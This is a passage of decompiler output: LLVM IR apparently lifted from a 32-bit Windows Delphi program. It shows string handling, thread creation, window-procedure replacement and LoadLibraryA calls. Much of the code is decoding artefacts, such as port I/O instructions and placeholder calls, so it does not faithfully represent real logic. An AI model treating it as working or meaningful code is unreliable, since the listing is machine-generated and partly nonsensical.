  %esp.0.reg2mem = alloca i32, !insn.addr !1431
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %5 = add i32 %2, 1, !insn.addr !1431
  %6 = inttoptr i32 %2 to i32*, !insn.addr !1431
  store i32 %5, i32* %6, align 4, !insn.addr !1431
  %7 = bitcast i32* %eax to i8*
  %8 = load i8, i8* %7, align 4, !insn.addr !1432
  %9 = load i32, i32* %eax, align 4
  %10 = trunc i32 %9 to i8, !insn.addr !1432
  %11 = add i8 %8, %10, !insn.addr !1432
  %12 = inttoptr i32 %9 to i8*, !insn.addr !1432
  store i8 %11, i8* %12, align 1, !insn.addr !1432
  %13 = add i32 %2, 58, !insn.addr !1433
  %14 = inttoptr i32 %13 to i8*, !insn.addr !1433
  %15 = load i8, i8* %14, align 1, !insn.addr !1433
  %16 = load i32, i32* %eax, align 4, !insn.addr !1433
  %17 = udiv i32 %16, 256, !insn.addr !1433
  %18 = trunc i32 %17 to i8, !insn.addr !1433
  %19 = add i8 %15, %18, !insn.addr !1433
  store i8 %19, i8* %14, align 1, !insn.addr !1433
  %20 = add i32 %0, 112, !insn.addr !1434
  %21 = inttoptr i32 %20 to i8*, !insn.addr !1434
  %22 = load i8, i8* %21, align 1, !insn.addr !1434
  %23 = trunc i32 %4 to i8, !insn.addr !1434
  %24 = add i8 %22, %23, !insn.addr !1434
  store i8 %24, i8* %21, align 1, !insn.addr !1434
  %25 = trunc i32 %3 to i16, !insn.addr !1435
  %26 = call i8 @__readgsbyte(i32 %1), !insn.addr !1435
  call void @__asm_outsb(i16 %25, i8 %26), !insn.addr !1435
  %27 = load i8, i8* %7, align 4, !insn.addr !1436
  %28 = load i32, i32* %eax, align 4
  %29 = trunc i32 %28 to i8, !insn.addr !1436
  %30 = add i8 %27, %29, !insn.addr !1436
  %31 = inttoptr i32 %28 to i8*, !insn.addr !1436
  store i8 %30, i8* %31, align 1, !insn.addr !1436
  %32 = load i8, i8* %7, align 4, !insn.addr !1437
  %33 = load i32, i32* %eax, align 4
  %34 = trunc i32 %33 to i8, !insn.addr !1437
  %35 = add i8 %32, %34, !insn.addr !1437
  %36 = inttoptr i32 %33 to i8*, !insn.addr !1437
  store i8 %35, i8* %36, align 1, !insn.addr !1437
  %37 = ptrtoint i32* %stack_var_0 to i32, !insn.addr !1438
  store i32 %37, i32* %esp.0.reg2mem, !insn.addr !1439
  store i32 11, i32* %ecx.0.reg2mem, !insn.addr !1439
  br label %dec_label_pc_406350, !insn.addr !1439

dec_label_pc_406350:                              ; preds = %dec_label_pc_406350, %dec_label_pc_406337
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %38 = add i32 %esp.0.reload, -4, !insn.addr !1440
  %39 = inttoptr i32 %38 to i32*, !insn.addr !1440
  store i32 0, i32* %39, align 4, !insn.addr !1440
  %40 = add i32 %esp.0.reload, -8, !insn.addr !1441
  %41 = inttoptr i32 %40 to i32*, !insn.addr !1441
  store i32 0, i32* %41, align 4, !insn.addr !1441
  %42 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1442
  %43 = icmp eq i32 %42, 0, !insn.addr !1442
  %44 = icmp eq i1 %43, false, !insn.addr !1443
  store i32 %40, i32* %esp.0.reg2mem, !insn.addr !1443
  store i32 %42, i32* %ecx.0.reg2mem, !insn.addr !1443
  br i1 %44, label %dec_label_pc_406350, label %dec_label_pc_406357, !insn.addr !1443

dec_label_pc_406357:                              ; preds = %dec_label_pc_406350
  %45 = add i32 %esp.0.reload, -12, !insn.addr !1444
  %46 = inttoptr i32 %45 to i32*, !insn.addr !1444
  store i32 0, i32* %46, align 4, !insn.addr !1444
  %47 = add i32 %esp.0.reload, -20, !insn.addr !1445
  %48 = inttoptr i32 %47 to i32*, !insn.addr !1445
  store i32 %37, i32* %48, align 4, !insn.addr !1445
  %49 = add i32 %esp.0.reload, -24, !insn.addr !1446
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1446
  store i32 4220310, i32* %50, align 4, !insn.addr !1446
  %51 = call i32 @__readfsdword(i32 0), !insn.addr !1447
  %52 = add i32 %esp.0.reload, -28, !insn.addr !1447
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1447
  store i32 %51, i32* %53, align 4, !insn.addr !1447
  call void @__writefsdword(i32 0, i32 %52), !insn.addr !1448
  %54 = call i32 @"@LStrPos"(), !insn.addr !1449
  %55 = add i32 %esp.0.reload, -32, !insn.addr !1450
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1450
  %57 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1450
  store i32 %57, i32* %56, align 4, !insn.addr !1450
  %58 = call i32 @"@LStrCopy"(), !insn.addr !1451
  %59 = add i32 %esp.0.reload, -36, !insn.addr !1452
  %60 = inttoptr i32 %59 to i32*
  %61 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1452
  store i32 %61, i32* %60, align 4, !insn.addr !1452
  %62 = call i32 @function_4034c8(), !insn.addr !1453
  %63 = call i32 @"@LStrCopy"(), !insn.addr !1454
  %64 = add i32 %arg1, -1, !insn.addr !1455
  store i32 %64, i32* %eax, align 4, !insn.addr !1455
  store i32* %60, i32** %.pre-phi.reg2mem
  store i32 %59, i32* %esp.1.reg2mem
  switch i32 %arg1, label %dec_label_pc_40657b [
    i32 0, label %dec_label_pc_4063c9
    i32 1, label %dec_label_pc_406506
    i32 2, label %dec_label_pc_406570
  ]

dec_label_pc_4063c9:                              ; preds = %dec_label_pc_406357
  %65 = call i32 @function_4034c8(), !insn.addr !1456
  %66 = icmp slt i32 %65, 5, !insn.addr !1457
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1457
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1457
  br i1 %66, label %dec_label_pc_40657b, label %dec_label_pc_4063da, !insn.addr !1457

dec_label_pc_4063da:                              ; preds = %dec_label_pc_4063c9
  %67 = call i32 @"@LStrFromPChar"(), !insn.addr !1458
  %68 = call i32 @function_4060f0(), !insn.addr !1459
  %69 = add i32 %esp.0.reload, -40, !insn.addr !1460
  %70 = inttoptr i32 %69 to i32*, !insn.addr !1460
  %71 = call i32 @"@LStrFromPChar"(), !insn.addr !1461
  %72 = call i32 @function_4060f0(), !insn.addr !1462
  %73 = add i32 %esp.0.reload, -44, !insn.addr !1463
  %74 = inttoptr i32 %73 to i32*, !insn.addr !1463
  %75 = load i32, i32* %stack_var_-4, align 4, !insn.addr !1464
  %76 = add i32 %esp.0.reload, -48, !insn.addr !1464
  %77 = inttoptr i32 %76 to i32*, !insn.addr !1464
  store i32 %75, i32* %77, align 4, !insn.addr !1464
  %78 = add i32 %esp.0.reload, -52, !insn.addr !1465
  %79 = inttoptr i32 %78 to i32*, !insn.addr !1465
  store i32 ptrtoint (i32* @global_var_4065b8 to i32), i32* %79, align 4, !insn.addr !1465
  %80 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1466
  %81 = add i32 %esp.0.reload, -56, !insn.addr !1466
  %82 = inttoptr i32 %81 to i32*, !insn.addr !1466
  store i32 %80, i32* %82, align 4, !insn.addr !1466
  %83 = call i32 @"@LStrCatN"(), !insn.addr !1467
  %84 = add i32 %esp.0.reload, -60, !insn.addr !1468
  %85 = inttoptr i32 %84 to i32*, !insn.addr !1468
  %86 = add i32 %esp.0.reload, -64, !insn.addr !1469
  %87 = inttoptr i32 %86 to i32*, !insn.addr !1469
  store i32 4220356, i32* %87, align 4, !insn.addr !1469
  %88 = load i32, i32* %stack_var_-4, align 4, !insn.addr !1470
  %89 = add i32 %esp.0.reload, -68, !insn.addr !1470
  %90 = inttoptr i32 %89 to i32*, !insn.addr !1470
  store i32 %88, i32* %90, align 4, !insn.addr !1470
  %91 = add i32 %esp.0.reload, -72, !insn.addr !1471
  %92 = inttoptr i32 %91 to i32*, !insn.addr !1471
  store i32 4220372, i32* %92, align 4, !insn.addr !1471
  %93 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1472
  %94 = add i32 %esp.0.reload, -76, !insn.addr !1472
  %95 = inttoptr i32 %94 to i32*, !insn.addr !1472
  store i32 %93, i32* %95, align 4, !insn.addr !1472
  %96 = add i32 %esp.0.reload, -80, !insn.addr !1473
  %97 = inttoptr i32 %96 to i32*, !insn.addr !1473
  store i32 4220388, i32* %97, align 4, !insn.addr !1473
  %98 = call i32 @function_407410(), !insn.addr !1474
  %99 = add i32 %esp.0.reload, -84, !insn.addr !1475
  %100 = inttoptr i32 %99 to i32*, !insn.addr !1475
  %101 = call i32 @"@LStrCatN"(), !insn.addr !1476
  %102 = add i32 %esp.0.reload, -88, !insn.addr !1477
  %103 = inttoptr i32 %102 to i32*, !insn.addr !1477
  %104 = add i32 %esp.0.reload, -92, !insn.addr !1478
  %105 = inttoptr i32 %104 to i32*
  %106 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1478
  store i32 %106, i32* %105, align 4, !insn.addr !1478
  %107 = call i32 @"@LStrFromPChar"(), !insn.addr !1479
  %108 = call i32 @function_4060f0(), !insn.addr !1480
  %109 = call i32 @"@LStrPos"(), !insn.addr !1481
  %110 = add i32 %109, -1, !insn.addr !1482
  %111 = add i32 %esp.0.reload, -96, !insn.addr !1483
  %112 = inttoptr i32 %111 to i32*, !insn.addr !1483
  store i32 %110, i32* %112, align 4, !insn.addr !1483
  %113 = call i32 @"@LStrFromPChar"(), !insn.addr !1484
  %114 = call i32 @function_4060f0(), !insn.addr !1485
  %115 = call i32 @"@LStrCopy"(), !insn.addr !1486
  %116 = load i32, i32* %stack_var_-40, align 4, !insn.addr !1487
  store i32 %116, i32* %112, align 4, !insn.addr !1488
  %117 = call i32 @"@LStrFromPChar"(), !insn.addr !1489
  %118 = call i32 @function_4060f0(), !insn.addr !1490
  %119 = add i32 %esp.0.reload, -100, !insn.addr !1491
  %120 = inttoptr i32 %119 to i32*, !insn.addr !1491
  %121 = call i32 @"@LStrFromPChar"(), !insn.addr !1492
  %122 = call i32 @function_4060f0(), !insn.addr !1493
  %123 = call i32 @function_4057d0(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1494
  store i32* %105, i32** %.pre-phi.reg2mem, !insn.addr !1495
  store i32 %104, i32* %esp.1.reg2mem, !insn.addr !1495
  br label %dec_label_pc_40657b, !insn.addr !1495

dec_label_pc_406506:                              ; preds = %dec_label_pc_406357
  %124 = call i32 @function_4034c8(), !insn.addr !1496
  %125 = icmp slt i32 %124, 5, !insn.addr !1497
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1497
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1497
  br i1 %125, label %dec_label_pc_40657b, label %dec_label_pc_406513, !insn.addr !1497

dec_label_pc_406513:                              ; preds = %dec_label_pc_406506
  %126 = add i32 %esp.0.reload, -40, !insn.addr !1498
  %127 = inttoptr i32 %126 to i32*, !insn.addr !1498
  store i32 ptrtoint ([5 x i8]* @global_var_406604 to i32), i32* %127, align 4, !insn.addr !1498
  %128 = call i32 @function_404b20(), !insn.addr !1499
  %129 = add i32 %esp.0.reload, -44, !insn.addr !1500
  %130 = inttoptr i32 %129 to i32*, !insn.addr !1500
  %131 = add i32 %esp.0.reload, -48, !insn.addr !1501
  %132 = inttoptr i32 %131 to i32*, !insn.addr !1501
  store i32 ptrtoint ([7 x i8]* @global_var_406614 to i32), i32* %132, align 4, !insn.addr !1501
  %133 = call i32 @function_404b20(), !insn.addr !1502
  %134 = add i32 %esp.0.reload, -52, !insn.addr !1503
  %135 = inttoptr i32 %134 to i32*
  %136 = call i32 @"@LStrCatN"(), !insn.addr !1504
  %137 = add i32 %esp.0.reload, -56, !insn.addr !1505
  %138 = inttoptr i32 %137 to i32*, !insn.addr !1505
  %139 = call i32 @"@LStrFromPChar"(), !insn.addr !1506
  %140 = call i32 @function_4060f0(), !insn.addr !1507
  %141 = call i32 @function_404c78(), !insn.addr !1508
  store i32* %135, i32** %.pre-phi.reg2mem, !insn.addr !1509
  store i32 %134, i32* %esp.1.reg2mem, !insn.addr !1509
  br label %dec_label_pc_40657b, !insn.addr !1509

dec_label_pc_406570:                              ; preds = %dec_label_pc_406357
  %142 = call i32 @function_4034c8(), !insn.addr !1510
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1511
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1511
  br label %dec_label_pc_40657b, !insn.addr !1511

dec_label_pc_40657b:                              ; preds = %dec_label_pc_406357, %dec_label_pc_406570, %dec_label_pc_406513, %dec_label_pc_406506, %dec_label_pc_4063da, %dec_label_pc_4063c9
  %143 = add i32 %esp.0.reload, -16, !insn.addr !1512
  %144 = inttoptr i32 %143 to i32*, !insn.addr !1512
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %145 = load i32, i32* %.pre-phi.reload, align 4, !insn.addr !1513
  call void @__writefsdword(i32 0, i32 %145), !insn.addr !1514
  %146 = add i32 %esp.1.reload, 8, !insn.addr !1515
  %147 = inttoptr i32 %146 to i32*, !insn.addr !1515
  store i32 4220317, i32* %147, align 4, !insn.addr !1515
  %148 = call i32 @"@LStrArrayClr"(), !insn.addr !1516
  ret i32 %148, !insn.addr !1517
}

define i32 @function_406596() local_unnamed_addr {
dec_label_pc_406596:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1518
  ret i32 %0, !insn.addr !1518
}

define i32 @function_40659b() local_unnamed_addr {
dec_label_pc_40659b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1519
}

define i32 @function_40659d(i32 %arg1) local_unnamed_addr {
dec_label_pc_40659d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1520
}

define i32 @function_4065c7() local_unnamed_addr {
dec_label_pc_4065c7:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1521
}

define i32 @function_4065cf() local_unnamed_addr {
dec_label_pc_4065cf:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !1522
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1522
  store i32 %1, i32* %2, align 4, !insn.addr !1522
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !1523
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !1523
  %7 = add i8 %4, %6, !insn.addr !1523
  %8 = inttoptr i32 %5 to i8*, !insn.addr !1523
  store i8 %7, i8* %8, align 1, !insn.addr !1523
  %9 = load i8, i8* %3, align 4, !insn.addr !1524
  %10 = load i32, i32* %eax, align 4
  %11 = udiv i32 %10, 256, !insn.addr !1524
  %12 = trunc i32 %11 to i8, !insn.addr !1524
  %13 = add i8 %9, %12, !insn.addr !1524
  %14 = inttoptr i32 %10 to i8*, !insn.addr !1524
  store i8 %13, i8* %14, align 1, !insn.addr !1524
  %15 = load i32, i32* %eax, align 4, !insn.addr !1525
  ret i32 %15, !insn.addr !1525
}

define i32 @function_4065d6() local_unnamed_addr {
dec_label_pc_4065d6:
  %0 = call x86_fp80 @function_406614(i32 ptrtoint (i32* @0 to i32)), !insn.addr !1526
  %1 = fptrunc x86_fp80 %0 to float, !insn.addr !1526
  %2 = bitcast float %1 to i32, !insn.addr !1526
  ret i32 %2, !insn.addr !1526
}

define i32 @function_406612() local_unnamed_addr {
dec_label_pc_406612:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8
  %2 = mul i8 %1, 2, !insn.addr !1527
  %3 = inttoptr i32 %0 to i8*, !insn.addr !1527
  store i8 %2, i8* %3, align 1, !insn.addr !1527
  ret i32 %0, !insn.addr !1527
}

define x86_fp80 @function_406614(i32 %arg1) local_unnamed_addr {
dec_label_pc_406614:
  %ebx.1.reg2mem = alloca i32, !insn.addr !1528
  %esp.1.reg2mem = alloca i32, !insn.addr !1528
  %ebx.0.reg2mem = alloca i32, !insn.addr !1528
  %esp.0.reg2mem = alloca i32, !insn.addr !1528
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call x86_fp80 @__decompiler_undefined_function_10()
  %3 = call i1 @__decompiler_undefined_function_1()
  %4 = call i1 @__decompiler_undefined_function_1()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  br i1 %3, label %dec_label_pc_406678, label %dec_label_pc_406617, !insn.addr !1528

dec_label_pc_406617:                              ; preds = %dec_label_pc_406614
  %5 = icmp eq i1 %4, false, !insn.addr !1529
  br i1 %5, label %dec_label_pc_40668c, label %dec_label_pc_406619, !insn.addr !1529

dec_label_pc_406619:                              ; preds = %dec_label_pc_406617
  %6 = trunc i32 %1 to i16, !insn.addr !1530
  %7 = call i8 @__asm_in(i16 %6), !insn.addr !1530
  %8 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1531
  %9 = add i32 %0, 12, !insn.addr !1532
  %10 = inttoptr i32 %9 to i32*, !insn.addr !1532
  %11 = load i32, i32* %10, align 4, !insn.addr !1532
  %12 = icmp eq i32 %11, 74, !insn.addr !1533
  %13 = icmp eq i1 %12, false, !insn.addr !1534
  store i32 %8, i32* %esp.1.reg2mem, !insn.addr !1534
  store i32 %11, i32* %ebx.1.reg2mem, !insn.addr !1534
  br i1 %13, label %dec_label_pc_40667d, label %dec_label_pc_406629, !insn.addr !1534

dec_label_pc_406629:                              ; preds = %dec_label_pc_406619
  %14 = call i32 @"@LStrSetLength"(), !insn.addr !1535
  %15 = call i32 @function_403720(), !insn.addr !1536
  %16 = call i32 @function_4045ac(), !insn.addr !1537
  %17 = add i32 %0, 20, !insn.addr !1538
  %18 = inttoptr i32 %17 to %_SECURITY_ATTRIBUTES*, !insn.addr !1539
  %19 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* %18, i32 0, i32 (i32*)* inttoptr (i32 1 to i32 (i32*)*), i32* inttoptr (i32 4219720 to i32*), i32 0, i32* null), !insn.addr !1540
  store i32 0, i32* %stack_var_-56, align 4, !insn.addr !1541
  %20 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1541
  store i32 %20, i32* %esp.0.reg2mem, !insn.addr !1541
  store i32 %11, i32* %ebx.0.reg2mem, !insn.addr !1541
  br label %dec_label_pc_406678, !insn.addr !1541

dec_label_pc_406678:                              ; preds = %dec_label_pc_406629, %dec_label_pc_406614
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %21 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1542
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !1542
  store i32 %ebx.0.reload, i32* %ebx.1.reg2mem, !insn.addr !1542
  br label %dec_label_pc_40667d, !insn.addr !1542

dec_label_pc_40667d:                              ; preds = %dec_label_pc_406678, %dec_label_pc_406619
  %ebx.1.reload = load i32, i32* %ebx.1.reg2mem
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %22 = add i32 %0, 20, !insn.addr !1543
  %23 = inttoptr i32 %22 to i32*, !insn.addr !1543
  %24 = load i32, i32* %23, align 4, !insn.addr !1543
  %25 = add i32 %esp.1.reload, -4, !insn.addr !1544
  %26 = inttoptr i32 %25 to i32*, !insn.addr !1544
  store i32 %24, i32* %26, align 4, !insn.addr !1544
  %27 = add i32 %0, 16, !insn.addr !1545
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1545
  %29 = load i32, i32* %28, align 4, !insn.addr !1545
  %30 = add i32 %esp.1.reload, -8, !insn.addr !1546
  %31 = inttoptr i32 %30 to i32*, !insn.addr !1546
  store i32 %29, i32* %31, align 4, !insn.addr !1546
  %32 = add i32 %esp.1.reload, -12, !insn.addr !1547
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1547
  store i32 %ebx.1.reload, i32* %33, align 4, !insn.addr !1547
  %34 = add i32 %0, 8, !insn.addr !1548
  %35 = inttoptr i32 %34 to i32*, !insn.addr !1548
  %36 = load i32, i32* %35, align 4, !insn.addr !1548
  %37 = add i32 %esp.1.reload, -16, !insn.addr !1549
  %38 = inttoptr i32 %37 to i32*, !insn.addr !1549
  store i32 %36, i32* %38, align 4, !insn.addr !1549
  ret x86_fp80 %2, !insn.addr !1549

dec_label_pc_40668c:                              ; preds = %dec_label_pc_406617
  %39 = fdiv x86_fp80 %2, %2, !insn.addr !1550
  ret x86_fp80 %39, !insn.addr !1551
}

define i32 @function_406698() local_unnamed_addr {
dec_label_pc_406698:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = ptrtoint i32 (i32, i32, i32)* %0 to i32
  %2 = call i32* @CreateWindowExA(i32 0, i8* null, i8* null, i32 0, i32 0, i32 0, i32 0, i32 %1, i32* null, i32* nonnull @0, i32* nonnull @0, i32* nonnull @0), !insn.addr !1552
  %3 = ptrtoint i32* %2 to i32, !insn.addr !1552
  %4 = call i32 @SetWindowLongA(i32* inttoptr (i32 4220444 to i32*), i32 -4, i32 %3), !insn.addr !1553
  ret i32 %4, !insn.addr !1554
}

define i32 @function_4066cd(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_4066cd:
  %merge7.reg2mem = alloca i32, !insn.addr !1555
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = trunc i32 %1 to i8
  %3 = mul i8 %2, 2, !insn.addr !1555
  %4 = inttoptr i32 %1 to i8*, !insn.addr !1555
  store i8 %3, i8* %4, align 1, !insn.addr !1555
  %5 = add i32 %1, 114, !insn.addr !1556
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1556
  %7 = load i8, i8* %6, align 1, !insn.addr !1556
  %8 = udiv i32 %0, 256, !insn.addr !1556
  %9 = trunc i32 %8 to i8, !insn.addr !1556
  %10 = add i8 %7, %9, !insn.addr !1556
  store i8 %10, i8* %6, align 1, !insn.addr !1556
  %11 = add i8 %2, -32, !insn.addr !1557
  %12 = icmp ult i8 %2, 32, !insn.addr !1557
  %13 = icmp eq i8 %11, 0, !insn.addr !1557
  %14 = zext i8 %11 to i32, !insn.addr !1557
  %15 = and i32 %1, -256, !insn.addr !1557
  %16 = or i32 %15, %14, !insn.addr !1557
  %17 = or i1 %12, %13, !insn.addr !1558
  store i32 %16, i32* %merge7.reg2mem, !insn.addr !1558
  br i1 %17, label %dec_label_pc_4066d6, label %dec_label_pc_406727, !insn.addr !1558

dec_label_pc_4066d6:                              ; preds = %dec_label_pc_4066cd
  %18 = add i32 %16, 105, !insn.addr !1559
  %19 = inttoptr i32 %18 to i8*, !insn.addr !1559
  %20 = load i8, i8* %19, align 1, !insn.addr !1559
  %21 = and i8 %20, %9, !insn.addr !1559
  store i8 %21, i8* %19, align 1, !insn.addr !1559
  %22 = trunc i32 %arg3 to i16, !insn.addr !1560
  %23 = inttoptr i32 %arg6 to i8*, !insn.addr !1560
  %24 = load i8, i8* %23, align 1, !insn.addr !1560
  call void @__asm_outsb(i16 %22, i8 %24), !insn.addr !1560
  %25 = add i32 %arg5, 105, !insn.addr !1561
  %26 = and i32 %25, 65535
  %27 = inttoptr i32 %26 to i8*, !insn.addr !1561
  %28 = load i8, i8* %27, align 1, !insn.addr !1561
  %29 = udiv i32 %arg2, 256, !insn.addr !1561
  %30 = trunc i32 %29 to i8, !insn.addr !1561
  %31 = and i8 %28, %30, !insn.addr !1561
  store i8 %31, i8* %27, align 1, !insn.addr !1561
  %32 = mul i32 %arg5, 2, !insn.addr !1562
  %33 = add i32 %arg2, 115, !insn.addr !1562
  %34 = add i32 %33, %32, !insn.addr !1562
  %35 = inttoptr i32 %34 to i8*, !insn.addr !1562
  %36 = load i8, i8* %35, align 1, !insn.addr !1562
  %37 = trunc i32 %arg2 to i8, !insn.addr !1562
  %38 = add i8 %36, %37, !insn.addr !1562
  %39 = icmp eq i8 %38, 0, !insn.addr !1562
  store i8 %38, i8* %35, align 1, !insn.addr !1562
  store i32 %arg1, i32* %merge7.reg2mem, !insn.addr !1563
  br i1 %39, label %dec_label_pc_406727, label %dec_label_pc_4066e5, !insn.addr !1563

dec_label_pc_4066e5:                              ; preds = %dec_label_pc_4066d6
  %40 = inttoptr i32 %arg6 to i32*, !insn.addr !1564
  %41 = load i32, i32* %40, align 4, !insn.addr !1564
  call void @__asm_outsd(i16 %22, i32 %41), !insn.addr !1564
  %42 = inttoptr i32 %arg5 to i8*, !insn.addr !1565
  %43 = call i32* @FindWindowA(i8* %42, i8* bitcast (i32* @0 to i8*)), !insn.addr !1565
  %44 = ptrtoint i32* %43 to i32, !insn.addr !1565
  %45 = icmp eq i32* %43, null, !insn.addr !1566
  %46 = icmp eq i1 %45, false, !insn.addr !1567
  store i32 %44, i32* %merge7.reg2mem, !insn.addr !1567
  br i1 %46, label %dec_label_pc_406727, label %dec_label_pc_406709, !insn.addr !1567

dec_label_pc_406709:                              ; preds = %dec_label_pc_4066e5
  %47 = call i32 @function_406698(), !insn.addr !1568
  %48 = call i32 @function_4036c8(), !insn.addr !1569
  %49 = inttoptr i32 %48 to i8*, !insn.addr !1570
  %50 = call i32* @LoadLibraryA(i8* %49), !insn.addr !1571
  %51 = ptrtoint i32* %50 to i32, !insn.addr !1571
  ret i32 %51, !insn.addr !1572

dec_label_pc_406727:                              ; preds = %dec_label_pc_4066cd, %dec_label_pc_4066e5, %dec_label_pc_4066d6
  %merge7.reload = load i32, i32* %merge7.reg2mem
  ret i32 %merge7.reload, !insn.addr !1573
}

define i32 @function_4067ed(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_4067ed:
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !1574
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_32 = alloca i32, align 4
  %stack_var_28 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_28, align 4
  %stack_var_16 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_16, align 4
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1574
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1574
  %9 = add i8 %6, %8, !insn.addr !1574
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1574
  store i8 %9, i8* %10, align 1, !insn.addr !1574
  %11 = load i32, i32* %eax, align 4, !insn.addr !1575
  %12 = add i32 %11, 114, !insn.addr !1575
  %13 = inttoptr i32 %12 to i8*, !insn.addr !1575
  %14 = load i8, i8* %13, align 1, !insn.addr !1575
  %15 = udiv i32 %2, 256, !insn.addr !1575
  %16 = trunc i32 %15 to i8, !insn.addr !1575
  %17 = add i8 %14, %16, !insn.addr !1575
  store i8 %17, i8* %13, align 1, !insn.addr !1575
  %18 = load i32, i32* %eax, align 4
  %19 = trunc i32 %18 to i8, !insn.addr !1576
  %20 = add i8 %19, -32, !insn.addr !1576
  %21 = icmp ult i8 %19, 32, !insn.addr !1576
  %22 = icmp eq i8 %20, 0, !insn.addr !1576
  %23 = zext i8 %20 to i32, !insn.addr !1576
  %24 = and i32 %18, -256, !insn.addr !1576
  %25 = or i32 %24, %23, !insn.addr !1576
  store i32 %25, i32* %eax, align 4, !insn.addr !1576
  %26 = or i1 %21, %22, !insn.addr !1577
  br i1 %26, label %dec_label_pc_4067f6, label %dec_label_pc_406865, !insn.addr !1577

dec_label_pc_4067f6:                              ; preds = %dec_label_pc_4067ed
  %27 = add i32 %25, 105, !insn.addr !1578
  %28 = inttoptr i32 %27 to i8*, !insn.addr !1578
  %29 = load i8, i8* %28, align 1, !insn.addr !1578
  %30 = and i8 %29, %16, !insn.addr !1578
  store i8 %30, i8* %28, align 1, !insn.addr !1578
  %31 = load i32, i32* %stack_var_28, align 4, !insn.addr !1579
  store i32 %31, i32* %eax, align 4, !insn.addr !1579
  %32 = trunc i32 %arg3 to i16, !insn.addr !1580
  %33 = inttoptr i32 %arg6 to i8*, !insn.addr !1580
  %34 = load i8, i8* %33, align 1, !insn.addr !1580
  call void @__asm_outsb(i16 %32, i8 %34), !insn.addr !1580
  %35 = add i32 %arg5, 105, !insn.addr !1581
  %36 = and i32 %35, 65535
  %37 = inttoptr i32 %36 to i8*, !insn.addr !1581
  %38 = load i8, i8* %37, align 1, !insn.addr !1581
  %39 = udiv i32 %arg2, 256, !insn.addr !1581
  %40 = trunc i32 %39 to i8, !insn.addr !1581
  %41 = and i8 %38, %40, !insn.addr !1581
